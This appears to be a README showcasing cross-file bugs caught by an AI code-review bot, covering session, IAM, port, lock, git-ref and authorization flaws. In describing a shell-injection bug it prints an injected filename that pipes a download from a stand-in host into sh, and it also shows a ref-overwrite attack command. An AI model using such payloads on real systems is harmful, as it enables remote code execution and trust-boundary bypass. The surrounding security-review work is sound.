# Review Examples

Reviews where knightwatch stitched evidence across multiple files or systems to surface a bug that wasn't visible in any single one. Ordered from most to least impressive. The first three are production catches in [`cncorp/plow`](https://github.com/cncorp/plow) the author (`@plonkus`) accepted and shipped fixes for; the rest are catches the bot made reviewing its own code.

---

## 1. `connector_used` middleware silently drops events on real auth routes

**Review:** [cncorp/plow#544 — DetachedInstance on `user.channels`](https://github.com/cncorp/plow/pull/544#issuecomment-4340939339) · *fix confirmed in [follow-up review](https://github.com/cncorp/plow/pull/544#issuecomment-4345823886)*

![plow#544 — connector_used middleware DetachedInstance](examples/plow544-connector-used.png)

Traced a `DetachedInstanceError` across five seams: ASGI middleware runs after `call_next` returns (so the SQLAlchemy session is closed), `lookup_session` only preloads `user` and not `user.channels`, the `$set` payload dereferences the unloaded relationship, the Calendar route never triggers the preload elsewhere, and the existing middleware test hides the bug by injecting a synthetic `auth_user` with channels prepopulated. Plonkus shipped the preload plus a real-auth e2e test in `test_auth.py`.

---

## 2. IAM rollout would crash the API at startup via Alembic

**Review:** [cncorp/plow#487 — Alembic bypasses the IAM hook](https://github.com/cncorp/plow/pull/487#issuecomment-4322608935) · *fix confirmed in [follow-up review](https://github.com/cncorp/plow/pull/487#issuecomment-4331628884)*

![plow#487 — IAM Alembic startup outage](examples/plow487-iam-alembic.png)

`start.sh` runs `alembic upgrade head` before Uvicorn, `alembic/env.py` builds a plain `create_engine(get_url())` without the IAM hook (only wired into `build_async_engine`), and Terraform had already removed `DB_PASSWORD` — so on rollout the migration would attempt passwordless auth as `plow_app` and the API would never boot. Plonkus made Alembic share `get_sync_connection()` with the runtime path so both seams obtain credentials the same way.

---

## 3. VM-loss probe vs plowd's canonical reader disagree on stale ports

**Review:** [cncorp/plow#552 — Phoenix probe reads stale port as live](https://github.com/cncorp/plow/pull/552#issuecomment-4349574160) · *fix shipped in commit `4ebe3098`, [confirmed by plonkus](https://github.com/cncorp/plow/pull/552#issuecomment-4354093632)*

![plow#552 — VM-loss probe stale-port mismatch](examples/plow552-vm-probe.png)

Phoenix's Swift VM-loss probe in `DaemonClient.swift` reads the persisted system-container `port` as proof the VM is alive, but plowd's canonical reader in `container_registry.py` only treats it as live when the container is `enabled` AND `running` — and `startContainer()` writes `.starting` before the guest listens while `stopContainer()` never clears the port, so the probe sees a stale port for 25 seconds and falsely restarts the runtime as "VM instance lost." Plonkus rerouted the probe through `ContainerRegistry` instead of `ServiceURLs.gatewayPort()`.

---

## 4. Shell injection via `eval` of PR-controlled filenames

**Review:** [knightwatch-reviewer#25 — `dead-code-eval`](https://github.com/srosro/knightwatch-reviewer/pull/25#issuecomment-4350469713)

![PR #25 — shell injection via eval](examples/01-pr25-shell-injection.png)

PR-controlled filenames from the diff flowed into `eval` inside `DEAD_CODE_CMDS`: a name like `'; curl evil/x | sh; '` would execute on the reviewer's host with its `gh` credentials and local repo access. The outer commands (`grep`/`find`) look safe — the injection seam is the substring they interpolate.

---

## 5. TOCTOU rewriting `origin/<default_branch>` mid-review

**Review:** [knightwatch-reviewer#29 — `.knightwatch` config TOCTOU](https://github.com/srosro/knightwatch-reviewer/pull/29#issuecomment-4357168423)

![PR #29 — TOCTOU on origin/<default_branch>](examples/02-pr29-toctou.png)

The worker runs the PR's own `just test` *before* reading `.knightwatch/*` policy from `origin/<default_branch>`, and a PR's test can call `git update-ref refs/remotes/origin/main <attacker-sha>` to silently overwrite that local ref. Trust-boundary bypass that requires the timing window, the git capability, and the assumption that `origin/main` is immutable to all line up.

---

## 6. `PrivateTmp=yes` defeating `/tmp` cross-tick locks

**Review:** [knightwatch-reviewer#18 — detached workers + PrivateTmp](https://github.com/srosro/knightwatch-reviewer/pull/18#issuecomment-4346528399)

![PR #18 — PrivateTmp defeating /tmp locks](examples/04-pr18-private-tmp-locks.png)

`PrivateTmp=yes` gives every `systemctl start` a fresh per-execution `/tmp` namespace, so the detached workers' lockfiles under `/tmp/pr-review-locks/<pr>` are invisible across timer ticks — two workers can launch concurrently for the same PR and `rm -rf` each other's checkout mid-review.

---

## 7. `git clone --shared` silently losing the base ref

**Review:** [knightwatch-reviewer#36 — non-default-base PRs lose `origin/<base>`](https://github.com/srosro/knightwatch-reviewer/pull/36#issuecomment-4359749179)

![PR #36 — clone --shared losing base ref](examples/05-pr36-clone-shared-base.png)

On non-default-base PRs the worker fetches `<BASE_REF>` into the canonical clone then `git clone --shared` into a per-PR workdir — but `--shared` only exposes canonical's *local* branches as `origin/*`, not `refs/remotes/origin/<BASE_REF>`, so the per-PR `origin/<BASE_REF>` is silently absent and the diff snaps to the wrong base. A failure class invisible to default-branch testing.

---

## 8. Cross-repo search authorization leak

**Review:** [knightwatch-reviewer#25 — `cross-repo-search-trust`](https://github.com/srosro/knightwatch-reviewer/pull/25#issuecomment-4350469713)

![PR #25 — cross-repo search auth leak](examples/03-pr25-cross-repo-leak.png)

Same review body as #4: the dead-code specialist greps across canonical's local clones, which share an object DB with sibling repos, but authorization is checked only against the *reviewed* repo. A collaborator on repo A could cause private sibling-repo B's paths and lines to surface in A's review — confused-deputy across what looked like one trust boundary.

---

## 9. Aborted aggregator outputs staged as prior reviews

**Review:** [knightwatch-reviewer#15 — `prior-reviews.md` from aborted runs](https://github.com/srosro/knightwatch-reviewer/pull/15#issuecomment-4344887837)

![PR #15 — aborted aggregator output staged as prior review](examples/06-pr15-aborted-aggregator.png)

The orchestrator was staging the aggregator's output as `prior-reviews.md` for the next round's bug-class-recurrence pass even when the aggregator exited non-zero with non-empty partial output — fabricating recurrence evidence from reviews the author never saw. Partial data here is worse than no data: it actively misleads the next pass instead of forcing it to start fresh.

---

## 10. Substring-triggered `/srosro-approve` approvals

**Review:** [knightwatch-reviewer#14 — `is_approve_request` substring match](https://github.com/srosro/knightwatch-reviewer/pull/14#issuecomment-4344404933)

![PR #14 — substring-triggered approval](examples/08-pr14-substring-approve.png)

`is_approve_request` checked comment bodies with `grep -qiF '/srosro-approve'` as a substring match, so a trusted collaborator writing "don't use `/srosro-approve` yet" or "we should add `/srosro-approve` later" would trigger a real `gh pr review --approve` side effect. Substring-vs-command-parse mismatch with auto-approve blast radius.

---

## 11. Merge-from-main hunks miscredited as branch-authored

**Review:** [knightwatch-reviewer#28 — review-scope diff includes upstream hunks](https://github.com/srosro/knightwatch-reviewer/pull/28#issuecomment-4356784178)

![PR #28 — merge-from-main hunks miscredited](examples/07-pr28-merge-from-main.png)

`git diff base..head` was including hunks the PR author never touched when they merged main and the merge re-shipped upstream lines — those hunks were being credited to the author in findings. A fairness regression that only surfaces after a merge-from-main on a long-running branch.
